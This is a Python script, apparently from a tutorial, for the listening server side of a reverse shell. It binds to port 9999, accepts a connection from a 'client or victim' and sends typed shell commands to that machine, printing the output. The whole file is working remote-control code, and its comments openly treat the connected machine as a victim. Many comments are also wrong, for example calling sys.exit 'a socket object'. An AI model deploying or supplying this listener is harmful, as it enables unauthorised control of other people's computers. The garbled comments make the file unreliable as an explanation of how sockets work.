import socket # its used to create sockets
import sys # its used to exit the program or used for running command line arguments

# Create a socket (connect two computers)
def create_socket():
    try:
        global host
        global port
        global s # its a socket object
        host = ""
        port = 9999 # random port number
        s = socket.socket() # its a socket object
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s # its a socket object

        print("Binding the Port: " + str(port))

        s.bind((host, port)) # its a socket object, here we are binding the socket with the port
        s.listen(5) # its a socket object, here we are listening for connections, so that we can accept connections

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket() # its a recursive function if any error occurs then it will call itself again

# Establish connection with a client (socket must be listening)
def socket_accept():
    conn, address = s.accept() # its a socket object, here we are accepting the connections
    print("Connection has been established! |" + " IP " + address[0] + " | Port" + str(address[1])) # its a socket object, here we are printing the ip address and port number of the client or victim
    send_commands(conn) # its a socket object, here we are sending commands to the client or victim
    conn.close() # its a socket object, here we are closing the connection


# Send commands to client/victim or a friend
def send_commands(conn):
    while True:
        cmd = input() # its a socket object, here we are taking the input from the user
        if cmd == 'quit':
            conn.close() # its a socket object, here we are closing the connection
            s.close() # its a socket object, here we are closing the socket
            sys.exit() # its a socket object, here we are exiting the program
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd)) # its a socket object, here we are sending the commands to the client or victim
            client_response = str(conn.recv(1024), "utf-8") # its a socket object, here we are receiving the commands from the client or victim
            print(client_response, end="") # its a socket object, here we are printing the commands from the client or victim

def main():
    create_socket()
    bind_socket()
    socket_accept()

main()



